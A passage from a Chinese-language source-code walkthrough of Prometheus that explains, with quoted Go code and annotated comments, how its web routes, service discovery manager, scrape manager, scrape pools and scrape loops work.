logger,\n\t\trouter:      router,\n\t\tquitCh:      make(chan struct{}),\n\t\treloadCh:    make(chan chan error),\n\t\toptions:     o,\n\t\tversionInfo: o.Version,\n\t\tbirth:       time.Now(),\n\t\tcwd:         cwd,\n\t\tflagsMap:    o.Flags,\n\n\t\tcontext:       o.Context,\n\t\tscrapeManager: o.ScrapeManager,\n\t\truleManager:   o.RuleManager,\n\t\tqueryEngine:   o.QueryEngine,\n\t\ttsdb:          o.TSDB,\n\t\tstorage:       o.Storage,\n\t\tnotifier:      o.Notifier,\n\n\t\tnow: model.Now,\n\n\t\tready: 0,\n\t}\n\n\th.apiV1 = api_v1.NewAPI(h.queryEngine, h.storage, h.scrapeManager, h.notifier,\n\t\tfunc() config.Config {\n\t\t\th.mtx.RLock()\n\t\t\tdefer h.mtx.RUnlock()\n\t\t\treturn *h.config\n\t\t},\n\t\th.testReady,\n\t\th.options.TSDB,\n\t\th.options.EnableAdminAPI,\n\t)\n\n\tif o.RoutePrefix != \"/\" {\n\t\t// If the prefix is missing for the root path, prepend it.\n\t\trouter.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t\thttp.Redirect(w, r, o.RoutePrefix, http.StatusFound)\n\t\t})\n\t\trouter = router.WithPrefix(o.RoutePrefix)\n\t}\n\n\tinstrh := prometheus.InstrumentHandler\n\tinstrf := prometheus.InstrumentHandlerFunc\n\treadyf := h.testReady\n\n\trouter.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\thttp.Redirect(w, r, path.Join(o.ExternalURL.Path, \"/graph\"), http.StatusFound)\n\t})\n\n\trouter.Get(\"/alerts\", readyf(instrf(\"alerts\", h.alerts)))   //alerts信息\n\trouter.Get(\"/graph\", readyf(instrf(\"graph\", h.graph)))      //graph接口\n\trouter.Get(\"/status\", readyf(instrf(\"status\", h.status)))    //status状态\n\trouter.Get(\"/flags\", readyf(instrf(\"flags\", h.flags)))\n\trouter.Get(\"/config\", readyf(instrf(\"config\", h.serveConfig)))\n\trouter.Get(\"/rules\", readyf(instrf(\"rules\", h.rules)))      //rules\n\trouter.Get(\"/targets\", readyf(instrf(\"targets\", h.targets))) // Bucket targets by job label\n\trouter.Get(\"/version\", readyf(instrf(\"version\", h.version)))\n\trouter.Get(\"/service-discovery\", readyf(instrf(\"servicediscovery\", h.serviceDiscovery)))\n\t//服务发现\n\trouter.Get(\"/heap\", instrf(\"heap\", h.dumpHeap))\n\n\trouter.Get(\"/metrics\", prometheus.Handler().ServeHTTP)\n\t//当前所有指标数据\n\trouter.Get(\"/federate\", readyf(instrh(\"federate\", httputil.CompressionHandler{\n\t\tHandler: http.HandlerFunc(h.federation),\n\t})))\n\n\trouter.Get(\"/consoles/*filepath\", readyf(instrf(\"consoles\", h.consoles)))\n\n\trouter.Get(\"/static/*filepath\", instrf(\"static\", h.serveStaticAsset))\n\n\tif o.UserAssetsPath != \"\" {\n\t\trouter.Get(\"/user/*filepath\", instrf(\"user\", route.FileServe(o.UserAssetsPath)))\n\t}\n\n\tif o.EnableLifecycle {\n\t\trouter.Post(\"/-/quit\", h.quit)\n\t\trouter.Post(\"/-/reload\", h.reload)\n\t} else {\n\t\trouter.Post(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) {\n\t\t\tw.WriteHeader(http.StatusForbidden)\n\t\t\tw.Write([]byte(\"Lifecycle APIs are not enabled\"))\n\t\t})\n\t\trouter.Post(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) {\n\t\t\tw.WriteHeader(http.StatusForbidden)\n\t\t\tw.Write([]byte(\"Lifecycle APIs are not enabled\"))\n\t\t})\n\t}\n\trouter.Get(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST requests allowed\"))\n\t})\n\trouter.Get(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST requests allowed\"))\n\t})\n\n\trouter.Get(\"/debug/*subpath\", serveDebug)\n\trouter.Post(\"/debug/*subpath\", serveDebug)\n\n\trouter.Get(\"/-/healthy\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\tfmt.Fprintf(w, \"Prometheus is Healthy.\\n\")\n\t})\n\trouter.Get(\"/-/ready\", readyf(func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\tfmt.Fprintf(w, \"Prometheus is Ready.\\n\")\n\t}))\n\n\treturn h\n}\n```\n\nreload接口调用发送信号给reloadCh，重新加载配置。web主要内容就这些。\n\n## DiscoveryManager\n\n数据采集之前，prometheus需要先发现数据采集的目标服务，然后从目标服务中获取指标数据，最后将指标数据存储到prometheus存储管理器中。\n\n服务发现结构配置：\n\n```go\n\n// ServiceDiscoveryConfig configures lists of different service discovery mechanisms.\ntype ServiceDiscoveryConfig struct {\n\t// List of labeled target groups for this job.\n\tStaticConfigs []*targetgroup.Group `yaml:\"static_configs,omitempty\"`\n\t// List of DNS service discovery configurations.\n\tDNSSDConfigs []*dns.SDConfig `yaml:\"dns_sd_configs,omitempty\"`\n\t// List of file service discovery configurations.\n\tFileSDConfigs []*file.SDConfig `yaml:\"file_sd_configs,omitempty\"`\n\t// List of Consul service discovery configurations.\n\tConsulSDConfigs []*consul.SDConfig `yaml:\"consul_sd_configs,omitempty\"`\n\t// List of Serverset service discovery configurations.\n\tServersetSDConfigs []*zookeeper.ServersetSDConfig `yaml:\"serverset_sd_configs,omitempty\"`\n\t// NerveSDConfigs is a list of Nerve service discovery configurations.\n\tNerveSDConfigs []*zookeeper.NerveSDConfig `yaml:\"nerve_sd_configs,omitempty\"`\n\t// MarathonSDConfigs is a list of Marathon service discovery configurations.\n\tMarathonSDConfigs []*marathon.SDConfig `yaml:\"marathon_sd_configs,omitempty\"`\n\t// List of Kubernetes service discovery configurations.\n\tKubernetesSDConfigs []*kubernetes.SDConfig `yaml:\"kubernetes_sd_configs,omitempty\"`\n\t// List of GCE service discovery configurations.\n\tGCESDConfigs []*gce.SDConfig `yaml:\"gce_sd_configs,omitempty\"`\n\t// List of EC2 service discovery configurations.\n\tEC2SDConfigs []*ec2.SDConfig `yaml:\"ec2_sd_configs,omitempty\"`\n\t// List of OpenStack service discovery configurations.\n\tOpenstackSDConfigs []*openstack.SDConfig `yaml:\"openstack_sd_configs,omitempty\"`\n\t// List of Azure service discovery configurations.\n\tAzureSDConfigs []*azure.SDConfig `yaml:\"azure_sd_configs,omitempty\"`\n\t// List of Triton service discovery configurations.\n\tTritonSDConfigs []*triton.SDConfig `yaml:\"triton_sd_configs,omitempty\"`\n\n\t// Catches all undefined fields and must be empty after parsing.\n\tXXX map[string]interface{} `yaml:\",inline\"`\n}\n```\n\nprometheus支持以上服务，除了StaticConfigs静态服务配置，其他都是动态的服务配置。\n\n对所有的服务发现，都提供一个抽象接口：\n\n```go\ntype Discoverer interface {\n\t// Run hands a channel to the discovery provider(consul,dns etc) through which it can send\n\t// updated target groups.\n\t// Must returns if the context gets canceled. It should not close the update\n\t// channel on returning.\n\tRun(ctx context.Context, up chan<- []*targetgroup.Group)\n}\n```\n\nprometheus将所发现的服务都转换成为了targetGroup.Group结构，通过 up发送给ScrapeManager，完成服务上线。\n\n代码路径：/discovery/targetgroup/targetgroup.go\n\n```go\n// Group is a set of targets with a common label set(production , test, staging etc.).\ntype Group struct {\n\t// Targets is a list of targets identified by a label set. Each target is\n\t// uniquely identifiable in the group by its address label.\n\tTargets []model.LabelSet\n\t// Labels is a set of labels that is common across all targets in the group.\n\tLabels model.LabelSet\n\n\t// Source is an identifier that describes a group of targets.\n\tSource string\n}\n```\n\n服务发现管理者Manager是所有发现服务的入口，服务的上线，下线和更新都需要进行服务同步。\n\nManager的结构：\n\n```go\n/ Manager maintains a set of discovery providers and sends each update to a map channel.\n// Targets are grouped by the target set name.\ntype Manager struct {\n\tlogger         log.Logger  //系统日志记录\n\tmtx            sync.RWMutex  //同步读写锁\n\tctx            context.Context  //协同控制\n\tdiscoverCancel []context.CancelFunc //服务下线调用\n\t// Some Discoverers(eg. k8s) send only the updates for a given target group\n\t// so we use map[tg.Source]*targetgroup.Group to know which group to update.\n    //发现的目标服务\n\ttargets map[poolKey]map[string]*targetgroup.Group\n\t// The sync channels sends the updates in map[targetSetName] where targetSetName is the job value from the scrape config.\n    //将所发现的目标服务以chan的方式通知接受方\n\tsyncCh chan map[string][]*targetgroup.Group\n}\n```\n\n在初始化的过程中给，构建discoveryManagerScrape，并通过调用applyConfig方法完成对Discoverer的构建。\n\n```go\n// ApplyConfig removes all running discovery providers and starts new ones using the provided config.\nfunc (m *Manager) ApplyConfig(cfg map[string]sd_config.ServiceDiscoveryConfig) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\n\tm.cancelDiscoverers()\n\tfor name, scfg := range cfg {\n\t\tfor provName, prov := range m.providersFromConfig(scfg) {\n\t\t\tm.startProvider(m.ctx, poolKey{setName: name, provider: provName}, prov)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\nstartProvider方法根据job_name，服务名称和具体的Discoverer实例启动所发现的scrape服务。\n\n```go\nfunc (m *Manager) providersFromConfig(cfg sd_config.ServiceDiscoveryConfig) map[string]Discoverer {\n\tproviders := map[string]Discoverer{}\n\n\tapp := func(mech string, i int, tp Discoverer) {\n\t\tproviders[fmt.Sprintf(\"%s/%d\", mech, i)] = tp\n\t}\n\n\tfor i, c := range cfg.DNSSDConfigs {\n\t\tapp(\"dns\", i, dns.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"dns\")))\n\t}\n\tfor i, c := range cfg.FileSDConfigs {\n\t\tapp(\"file\", i, file.NewDiscovery(c, log.With(m.logger, \"discovery\", \"file\")))\n\t}\n\tfor i, c := range cfg.ConsulSDConfigs {\n\t\tk, err := consul.NewDiscovery(c, log.With(m.logger, \"discovery\", \"consul\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Consul discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"consul\", i, k)\n\t}\n\tfor i, c := range cfg.MarathonSDConfigs {\n\t\tt, err := marathon.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"marathon\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Marathon discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"marathon\", i, t)\n\t}\n\tfor i, c := range cfg.KubernetesSDConfigs {\n\t\tk, err := kubernetes.New(log.With(m.logger, \"discovery\", \"k8s\"), c)\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Kubernetes discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"kubernetes\", i, k)\n\t}\n\tfor i, c := range cfg.ServersetSDConfigs {\n\t\tapp(\"serverset\", i, zookeeper.NewServersetDiscovery(c, log.With(m.logger, \"discovery\", \"zookeeper\")))\n\t}\n\tfor i, c := range cfg.NerveSDConfigs {\n\t\tapp(\"nerve\", i, zookeeper.NewNerveDiscovery(c, log.With(m.logger, \"discovery\", \"nerve\")))\n\t}\n\tfor i, c := range cfg.EC2SDConfigs {\n\t\tapp(\"ec2\", i, ec2.NewDiscovery(c, log.With(m.logger, \"discovery\", \"ec2\")))\n\t}\n\tfor i, c := range cfg.OpenstackSDConfigs {\n\t\topenstackd, err := openstack.NewDiscovery(c, log.With(m.logger, \"discovery\", \"openstack\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot initialize OpenStack discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"openstack\", i, openstackd)\n\t}\n\n\tfor i, c := range cfg.GCESDConfigs {\n\t\tgced, err := gce.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"gce\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot initialize GCE discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"gce\", i, gced)\n\t}\n\tfor i, c := range cfg.AzureSDConfigs {\n\t\tapp(\"azure\", i, azure.NewDiscovery(c, log.With(m.logger, \"discovery\", \"azure\")))\n\t}\n\tfor i, c := range cfg.TritonSDConfigs {\n\t\tt, err := triton.New(log.With(m.logger, \"discovery\", \"trition\"), c)\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Triton discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"triton\", i, t)\n\t}\n\tif len(cfg.StaticConfigs) > 0 {\n\t\tapp(\"static\", 0, NewStaticProvider(cfg.StaticConfigs))\n\t}\n\n\treturn providers\n}\n```\n\n调用startProvider启动服务：\n\n```go\nfunc (m *Manager) startProvider(ctx context.Context, poolKey poolKey, worker Discoverer) {\n\tctx, cancel := context.WithCancel(ctx)\n\tupdates := make(chan []*targetgroup.Group)\n\n\tm.discoverCancel = append(m.discoverCancel, cancel)\n\n\tgo worker.Run(ctx, updates)\n\tgo m.runProvider(ctx, poolKey, updates)\n}\n\nfunc (m *Manager) runProvider(ctx context.Context, poolKey poolKey, updates chan []*targetgroup.Group) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\treturn\n\t\tcase tgs, ok := <-updates:\n\t\t\t// Handle the case that a target provider exits and closes the channel\n\t\t\t// before the context is done.\n\t\t\tif !ok {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tm.updateGroup(poolKey, tgs)\n\t\t\tm.syncCh <- m.allGroups()\n\t\t}\n\t}\n}\n```\n\n各个服务在discovery目录中对应的服务启动。如DNS Discovery服务在完成启动之后，runProvider将接收更新之后的服务信息updates，并将新的服务信息通过updateGroup方法同步到targets列表，在调用allgroups方法完成对服务快照信息的构建，发送到指标的管理器中ScraperManager。\n\n流程：\n\n![1572414553678](/images/1572414553678.png)\n\n## ScrapeManager\n\nscrapeManager组件的采集周期在prometheus.yml配置文件中由global节点下的scrape_interval指定，各个job_name可以在scrape_configs下进行个性化的设置，设置符合自身场景的scrape_interval\n\n指标采集是指从发现的服务中定时获取指标数据。prometheus在启动的过程中会完成对scrapeManager的初始化，初始化过程包括构建scrapeManager实列，加载配置启动scrapeManager实例三个。scrapeManager复制维护scrapePool，并管理scrape组件的生命周期\n\nScrapeManager通过调用NewScrapeManager方法完成对scapeManager实例的创建。\n\n```go\n// ScrapeManager maintains a set of scrape pools and manages start/stop cycles\n// when receiving new target groups form the discovery manager.\ntype ScrapeManager struct {\n\tlogger        log.Logger\n\tappend        Appendable    //指标存储器\n\tscrapeConfigs map[string]*config.ScrapeConfig  //job_name scrape配置\n\tscrapePools   map[string]*scrapePool  //job_name指标采集器\n\tmtx           sync.RWMutex //同步访问控制，读写锁\n\tgraceShut     chan struct{}  //scrapemanager关闭控制\n}\n\n```\n\n初始化ScrapeManager结构;\n\n```go\n// NewScrapeManager is the ScrapeManager constructor\nfunc NewScrapeManager(logger log.Logger, app Appendable) *ScrapeManager {\n\n\treturn &ScrapeManager{\n\t\tappend:        app,\n\t\tlogger:        logger,\n\t\tscrapeConfigs: make(map[string]*config.ScrapeConfig),\n\t\tscrapePools:   make(map[string]*scrapePool),\n\t\tgraceShut:     make(chan struct{}),\n\t}\n}\n```\n\nscrapeManager的配置加载，是根据prometheus.yml中的scrape_configs配置项，对scrape服务进行配置更新处理，调用方法为ApplyConfig，器内部实现分初次加载和配置更新动态加载两种。\n\n```go\n// ScrapeConfig configures a scraping unit for Prometheus.\ntype ScrapeConfig struct {\n\t// The job name to which the job label is set by default.\n\tJobName string `yaml:\"job_name\"`\n\t// Indicator whether the scraped metrics should remain unmodified.\n\tHonorLabels bool `yaml:\"honor_labels,omitempty\"`\n\t// A set of query parameters with which the target is scraped.\n\tParams url.Values `yaml:\"params,omitempty\"`\n\t// How frequently to scrape the targets of this scrape config.\n\tScrapeInterval model.Duration `yaml:\"scrape_interval,omitempty\"`\n\t// The timeout for scraping targets of this config.\n\tScrapeTimeout model.Duration `yaml:\"scrape_timeout,omitempty\"`\n\t// The HTTP resource path on which to fetch metrics from targets.\n\tMetricsPath string `yaml:\"metrics_path,omitempty\"`\n\t// The URL scheme with which to fetch metrics from targets.\n\tScheme string `yaml:\"scheme,omitempty\"`\n\t// More than this many samples post metric-relabelling will cause the scrape to fail.\n\tSampleLimit uint `yaml:\"sample_limit,omitempty\"`\n\n\t// We cannot do proper Go type embedding below as the parser will then parse\n\t// values arbitrarily into the overflow maps of further-down types.\n\n\tServiceDiscoveryConfig sd_config.ServiceDiscoveryConfig `yaml:\",inline\"`\n\tHTTPClientConfig       config_util.HTTPClientConfig     `yaml:\",inline\"`\n\n\t// List of target relabel configurations.\n\tRelabelConfigs []*RelabelConfig `yaml:\"relabel_configs,omitempty\"`\n\t// List of metric relabel configurations.\n\tMetricRelabelConfigs []*RelabelConfig `yaml:\"metric_relabel_configs,omitempty\"`\n\n\t// Catches all undefined fields and must be empty after parsing.\n\tXXX map[string]interface{} `yaml:\",inline\"`\n}\n\n// ApplyConfig resets the manager's target providers and job configurations as defined by the new cfg.\nfunc (m *ScrapeManager) ApplyConfig(cfg *config.Config) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\tc := make(map[string]*config.ScrapeConfig)\n\tfor _, scfg := range cfg.ScrapeConfigs {\n\t\tc[scfg.JobName] = scfg\n\t}\n\tm.scrapeConfigs = c\n\n\t// Cleanup and reload pool if config has changed.\n\tfor name, sp := range m.scrapePools {\n\t\tif cfg, ok := m.scrapeConfigs[name]; !ok {\n\t\t\tsp.stop()\n\t\t\tdelete(m.scrapePools, name)\n\t\t} else if !reflect.DeepEqual(sp.config, cfg) {\n\t\t\tsp.reload(cfg)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\nsp.reload方法将重新配置scrapePool，流程为：\n\n1. 构建scrapeLoop服务\n\n2. 停止线上所对应的scrapeLoop服务\n3. 启动新的scrapeLoop服务\n\n以上三步动态更新；\n\n```go\n// reload the scrape pool with the given scrape configuration. The target state is preserved\n// but all scrape loops are restarted with the new scrape configuration.\n// This method returns after all scrape loops that were stopped have stopped scraping.\nfunc (sp *scrapePool) reload(cfg *config.ScrapeConfig) {\n\tstart := time.Now()\n\n\tsp.mtx.Lock()\n\tdefer sp.mtx.Unlock()\n\n\tclient, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, cfg.JobName)\n\tif err != nil {\n\t\t// Any errors that could occur here should be caught during config validation.\n\t\tlevel.Error(sp.logger).Log(\"msg\", \"Error creating HTTP client\", \"err\", err)\n\t}\n\tsp.config = cfg\n\tsp.client = client\n\n\tvar (\n\t\twg       sync.WaitGroup\n\t\tinterval = time.Duration(sp.config.ScrapeInterval)\n\t\ttimeout  = time.Duration(sp.config.ScrapeTimeout)\n\t)\n\n\tfor fp, oldLoop := range sp.loops {\n\t\tvar (\n\t\t\tt       = sp.targets[fp]\n\t\t\ts       = &targetScraper{Target: t, client: sp.client, timeout: timeout}\n\t\t\tnewLoop = sp.newLoop(t, s)\n\t\t)\n\t\twg.Add(1)\n\n\t\tgo func(oldLoop, newLoop loop) {\n            //停止线上的老的scrapeLoop服务\n\t\t\toldLoop.stop()\n\t\t\twg.Done()\n\t\t\t//启动新的scrapeLoop服务\n\t\t\tgo newLoop.run(interval, timeout, nil)\n\t\t}(oldLoop, newLoop)\n\t\t//更新scrapePool中的scrapeLoop服务\n\t\tsp.loops[fp] = newLoop\n\t}\n\n\twg.Wait()\n\t//更新采集周期\t\ttargetReloadIntervalLength.WithLabelValues(interval.String()).Observe(\n\t\ttime.Since(start).Seconds(),\n\t)\n}\n```\n\n配置加载流程：\n\n![1572415259519](/images/1572415259519.png)\n\nScrapeManager通过调用retrieval下的Manager.Run方法完成启动，其参数为prometheus.yml配置发现的目标服务，有discovery模块中的Manager.SyncCh 方法负责和ScrapeManager通信。\n\n当SyncSh发生变化时，将触发ScrapeManager中的reload方法，在reload方法中会遍历目标服务，根据tsetName（jobName）从scrapePools中查找scrapePool，如果找不到则新建一个scrapePool，使得每个job都有一个对应的scrapePool\n\n```go\n// Run starts background processing to handle target updates and reload the scraping loops.\nfunc (m *ScrapeManager) Run(tsets <-chan map[string][]*targetgroup.Group) error {\n\tlevel.Info(m.logger).Log(\"msg\", \"Starting scrape manager...\")\n\n\tfor {\n\t\tselect {\n\t\tcase ts := <-tsets:\n\t\t\tm.reload(ts)\n\t\tcase <-m.graceShut:\n\t\t\treturn nil\n\t\t}\n\t}\n```\n\n```go\nfunc (m *ScrapeManager) reload(t map[string][]*targetgroup.Group) {\n\tfor tsetName, tgroup := range t {\n\t\tscrapeConfig, ok := m.scrapeConfigs[tsetName]\n\t\tif !ok {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"error reloading target set\", \"err\", fmt.Sprintf(\"invalid config id:%v\", tsetName))\n\t\t\tcontinue\n\t\t}\n\t\t//检查ScrapePool中服务是否存在，不存在构建新的ScrapePool\n\t\t// Scrape pool doesn't exist so start a new one.\n\t\texisting, ok := m.scrapePools[tsetName]\n\t\tif !ok {\n\t\t\tsp := newScrapePool(scrapeConfig, m.append, log.With(m.logger, \"scrape_pool\", tsetName))\n\t\t\tm.scrapePools[tsetName] = sp\n\t\t\tsp.Sync(tgroup)\n\t\t\t//调用Sync方法同步目标服务和启动scrape\n\t\t} else {\n            //同步目标服务并启动scrape\n\t\t\texisting.Sync(tgroup)\n\t\t}\n\t}\n}\n```\n\nsp.Sync方法主要用于将tgroup转换为Target类型，再调用scrapePool.sync方法同步scrape服务。\n\nScrapePool主要管理目标服务和scrapeLoop\n\nSync方法具体实现：\n\n```go\n// Sync converts target groups into actual scrape targets and synchronizes\n// the currently running scraper with the resulting set.\nfunc (sp *scrapePool) Sync(tgs []*targetgroup.Group) {\n\tstart := time.Now()\n\n\tvar all []*Target\n\tsp.mtx.Lock()\n\tsp.droppedTargets = []*Target{}\n\tfor _, tg := range tgs {\n        //Group转换成target\n\t\ttargets, err := targetsFromGroup(tg, sp.config)\n\t\tif err != nil {\n\t\t\tlevel.Error(sp.logger).Log(\"msg\", \"creating targets failed\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tfor _, t := range targets {\n            //检查Target是否存在有有效的Label\n\t\t\tif t.Labels().Len() > 0 {\n\t\t\t\tall = append(all, t)\n                //记录无效的Target\n\t\t\t} else if t.DiscoveredLabels().Len() > 0 {\n\t\t\t\tsp.droppedTargets = append(sp.droppedTargets, t)\n\t\t\t}\n\t\t}\n\t}\n\tsp.mtx.Unlock()\n    //同步scrape服务\n\tsp.sync(all)\n//更新系统指标\n\ttargetSyncIntervalLength.WithLabelValues(sp.config.JobName).Observe(\n\t\ttime.Since(start).Seconds(),\n\t)\n\ttargetScrapePoolSyncsCounter.WithLabelValues(sp.config.JobName).Inc()\n}\n```\n\nscrapePool.sync方法将输入参数targets与原有的targets列表sp.targets进行对比，如果有新的target加入，就创建新的targetScraper和scrapeLoop，并且启动新的scrapeLoop，如果发现已经失效的target,就会停止scrapeLoop服务并删除对应的target和scrapeLoop\n\n```go\n// sync takes a list of potentially duplicated targets, deduplicates them, starts\n// scrape loops for new targets, and stops scrape loops for disappeared targets.\n// It returns after all stopped scrape loops terminated.\nfunc (sp *scrapePool) sync(targets []*Target) {\n\tsp.mtx.Lock()\n\tdefer sp.mtx.Unlock()\n\n\tvar (\n\t\tuniqueTargets = map[uint64]struct{}{}\n\t\tinterval      = time.Duration(sp.config.ScrapeInterval)\n\t\ttimeout       = time.Duration(sp.config.ScrapeTimeout)\n\t)\n\n\tfor _, t := range targets {\n\t\tt := t\n\t\thash := t.hash()\n\t\tuniqueTargets[hash] = struct{}{}\n\n\t\tif _, ok := sp.targets[hash]; !ok {\n\t\t\ts := &targetScraper{Target: t, client: sp.client, timeout: timeout}\n\t\t\tl := sp.newLoop(t, s)\n\n\t\t\tsp.targets[hash] = t\n\t\t\tsp.loops[hash] = l\n\n\t\t\tgo l.run(interval, timeout, nil)\n\t\t}\n\t}\n\n\tvar wg sync.WaitGroup\n\n\t// Stop and remove old targets and scraper loops.\n\tfor hash := range sp.targets {\n\t\tif _, ok := uniqueTargets[hash]; !ok {\n\t\t\twg.Add(1)\n\t\t\tgo func(l loop) {\n\t\t\t\tl.stop()\n\t\t\t\twg.Done()\n\t\t\t}(sp.loops[hash])\n\n\t\t\tdelete(sp.loops, hash)\n\t\t\tdelete(sp.targets, hash)\n\t\t}\n\t}\n\n\t// Wait for all potentially stopped scrapers to terminate.\n\t// This covers the case of flapping targets. If the server is under high load, a new scraper\n\t// may be active and tries to insert. The old scraper that didn't terminate yet could still\n\t// be inserting a previous sample set.\n\twg.Wait()\n}\n```\n\nscrapeLoop是scrape的直接管理者，每个scrapeLoop都通过一个goroutine来运行，scrapeLoop控制scrape进行指标的拉取\n\n```go\nfunc (sl *scrapeLoop) run(interval, timeout time.Duration, errc chan<- error) {\n\tselect {\n\tcase <-time.After(sl.scraper.offset(interval)):\n\t\t// Continue after a scraping offset.\n\tcase <-sl.scrapeCtx.Done():\n\t\tclose(sl.stopped)\n\t\treturn\n\t}\n\n\tvar last time.Time\n     \n\tticker := time.NewTicker(interval)\n\tdefer ticker.Stop()\n    //初始化指标存储空间\n\tbuf := bytes.NewBuffer(make([]byte, 0, 16000))\n\nmainLoop:\n\tfor {\n\t\tbuf.Reset()\n\t\tselect {\n            //停止scrapeLoop\n\t\tcase <-sl.ctx.Done():\n\t\t\tclose(sl.stopped)\n\t\t\treturn\n\t\tcase <-sl.scrapeCtx.Done():\n\t\t\tbreak mainLoop\n\t\tdefault:\n\t\t}\n\n\t\tvar (\n\t\t\tstart             = time.Now()\n\t\t\tscrapeCtx, cancel = context.WithTimeout(sl.ctx, timeout)\n\t\t)\n\n\t\t// Only record after the first scrape.\n\t\tif !last.IsZero() {\n\t\t\ttargetIntervalLength.WithLabelValues(interval.String()).Observe(\n\t\t\t\ttime.Since(last).Seconds(),\n\t\t\t)\n\t\t}\n        //根据最后一次的scrape到指标的大小来申请本次存储空间\n\t\tb := sl.buffers.Get(sl.lastScrapeSize)\n\t\tbuf := bytes.NewBuffer(b)\n\t\t//scrape指标\n\t\tscrapeErr := sl.scraper.scrape(scrapeCtx, buf)\n\t\tcancel()\n\n\t\tif scrapeErr == nil {\n\t\t\tb = buf.Bytes()\n\t\t\t// NOTE: There were issues with misbehaving clients in the past\n\t\t\t// that occasionally returned empty results. We don't want those\n\t\t\t// to falsely reset our buffer size.\n\t\t\tif len(b) > 0 {\n                //记录本次scrape到指标的大小\n\t\t\t\tsl.lastScrapeSize = len(b)\n\t\t\t}\n\t\t} else {\n\t\t\tlevel.Debug(sl.l).Log(\"msg\", \"Scrape failed\", \"err\", scrapeErr.Error())\n\t\t\tif errc != nil {\n\t\t\t\terrc <- scrapeErr\n\t\t\t}\n\t\t}\n\n\t\t// A failed scrape is the same as an empty scrape,\n\t\t// we still call sl.append to trigger stale markers.\n        //存储指标\n\t\ttotal, added, appErr := sl.append(b, start)\n\t\tif appErr != nil {\n\t\t\tlevel.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", appErr)\n\t\t\t// The append failed, probably due to a parse error or sample limit.\n\t\t\t// Call sl.append again with an empty scrape to trigger stale markers.\n\t\t\tif _, _, err := sl.append([]byte{}, start); err != nil {\n\t\t\t\tlevel.Warn(sl.l).Log(\"msg\", \"append failed\", \"err\", err)\n\t\t\t}\n\t\t}\n\t\t//对象复用\n\t\tsl.buffers.Put(b)\n\n\t\tif scrapeErr == nil {\n\t\t\tscrapeErr = appErr\n\t\t}\n\t\t//统计采集到的指标\n\t\tsl.report(start, time.Since(start), total, added, scrapeErr)\n\t\tlast = start\n\n\t\tselect {\n\t\tcase <-sl.ctx.Done():\n\t\t\tclose(sl.stopped)\n\t\t\treturn\n\t\tcase <-sl.scrapeCtx.Done():\n\t\t\tbreak mainLoop\n\t\tcase <-ticker.C:\n\t\t}\n\t}\n\n\tclose(sl.stopped)\n\n\tsl.endOfRunStaleness(last, ticker, interval)\n}\n```\n\nrun方法中调用sl.scraper.scrape进行指标采集，并将采集到的指标通过sl.append方法进行存储。\n\n再scrape过程中为了提供性能，使用sync.Pool机制来复用对象，再每次scrape后都会向pool申请和scrape结果相同大小的byte slice，并添加到sl.buffers中，以便供下一次获取指标使用\n\n流程：\n\n![1572416216523](/images/1572416216523.png)\n\n## LocalStorage/RemoteStorage\n\nPrometheus再通过scrape获取指标后，调用scrapeLoop.append方法将指标存储到fanoutStorage组件中，但再scrape与fanoutStorage之间加了一层scrapeCache，用于指标合法行校验。\n\nscrapeCache缓存了两种不合法的指标：\n\n1）指标纬度为空，无效指标\n\n2）连续两次指标存储中，第一次存储的不带时间戳指标再第二次存储的不带时间戳指标中不存在，这部分指标过期指标\n\nscrapeCache:\n\n```go\n// scrapeCache tracks mappings of exposed metric strings to label sets and\n// storage references. Additionally, it tracks staleness of series between\n// scrapes.\ntype scrapeCache struct {\n\titer uint64 // Current scrape iteration.\n\t// 被缓存的批次数\n\t// Parsed string to an entry with information about the actual label set\n\t// and its storage reference.\n\tentries map[string]*cacheEntry\n\t// 缓存本次采集的指标\n\t// Cache of dropped metric strings and their iteration. The iteration must\n\t// be a pointer so we can update it without setting a new entry with an unsafe\n\t// string in addDropped().\n\tdropped map[string]*uint64\n    //缓存本次采集的指标\n\n\t// seriesCur and seriesPrev store the labels of series that were seen\n\t// in the current and previous scrape.\n\t// We hold two maps and swap them out to save allocations.\n\tseriesCur  